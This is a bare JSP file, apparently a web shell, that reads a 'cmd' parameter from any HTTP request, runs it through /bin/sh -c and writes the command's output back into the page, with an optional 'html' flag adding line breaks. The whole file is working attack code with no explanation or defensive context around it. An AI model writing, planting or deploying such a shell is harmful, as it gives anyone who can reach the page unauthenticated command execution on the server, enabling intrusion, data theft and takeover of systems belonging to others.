<%@ page import="java.io.*" %>
<%
      
Process p;
String s, cmd, html;

cmd = request.getParameter("cmd");
if (cmd == null) {
    cmd = "pwd";
}

String []bashcmd = {"/bin/sh","-c",cmd}; 

html = request.getParameter("html");

if (html != null) {
    out.println("<HTML>");
}

p = Runtime.getRuntime().exec(bashcmd);

BufferedReader stdInput = new BufferedReader(new 
					     InputStreamReader(p.getInputStream()));

BufferedReader stdError = new BufferedReader(new 
					     InputStreamReader(p.getErrorStream()));



while ((s = stdInput.readLine()) != null) {
    out.println(s); 
    if (html != null) {
	out.println("<br>");
    }
}


while ((s = stdError.readLine()) != null) {
    System.out.println(s);
    if (html != null) {
	out.println("<br>");
    }

}


%>